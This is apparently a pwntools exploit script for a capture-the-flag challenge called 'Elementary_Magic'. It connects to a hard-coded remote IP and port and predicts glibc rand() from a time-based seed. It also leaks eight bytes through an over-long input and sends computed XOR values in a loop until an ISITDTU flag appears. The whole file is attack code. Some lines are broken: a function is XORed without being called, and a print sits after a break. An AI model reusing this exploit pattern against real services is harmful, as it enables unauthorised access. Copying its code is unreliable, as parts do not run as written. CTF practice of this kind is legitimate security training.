from pwn import *
from ctypes import *
import time

context.log_level = 'debug'
# context.log_level = 'info'
context.arch = "amd64"

e = context.binary = ELF('source')
# r= e.process()
# r= remote("34.126.117.161",2000)
lib = e.libc

proc = CDLL("/usr/lib/x86_64-linux-gnu/libc.so.6")
timefunc = proc.time
srand = proc.srand
rand = proc.rand
output=b""
while(1):
    try:
        r= remote("34.126.117.161",2000)
        r.recvuntil(b"================================Elementary_Magic================================\n")
        give = int(r.recvline(),10)
        check = timefunc(0)
        padd = give-check
        print("Give time: " +str(give))
        print("Check time: " +str(check))
        print("Padding: " +str(padd))
        def rand_value():
            srand(timefunc(0)+padd)
            randnum = rand()
            log.info("rand_value: %d" % randnum)
            return randnum
            
        def Time_Freeze():
            return timefunc(0)+padd
            
        result  = 0xDEADBEEFDEADC0DE
        rand = proc.rand
        srand = proc.srand
        srand(give)
        randnum = rand()
        print(randnum)

        r.sendafter(b"Pause time, enter to continue:",b"\x0a")

        number  = c_longlong(result^randnum^Time_Freeze)  #0xdeadbeefdeadc0de = num^rd^time1;
        print("My Input_Number: ")
        print(number.value)
        pause()
        r.sendlineafter(b"Shout out the magic number sequence!\n", str(number.value))
        # r.interactive()

        print("LV2:")
        pause()
        r.sendafter(b"Scream your advanced magic!",b"a"*30 +b"::")
        r.recvuntil(b"::")
        urand_num = u64(r.recv(8).ljust(8,b"\x00"))
        print("My urandnum: ")
        print(hex(urand_num))

        pause()
        r.sendafter(b"Pause time, enter to continue:",b"\x0a")
        srand_val= rand_value()

        number  = c_longlong(result^urand_num^srand_val)  #result= (long long int)urand_num^srand_val^num;
        print("My Input_Number: ")
        print(number.value)
        pause()
        r.sendlineafter(b"Shout out the magic number sequence!", str(number.value))
            
        output = r.recvall()
    except:
        if b"ISITDTU{" in output:
            break
            print(output)
            
         
        # r.interactive()



    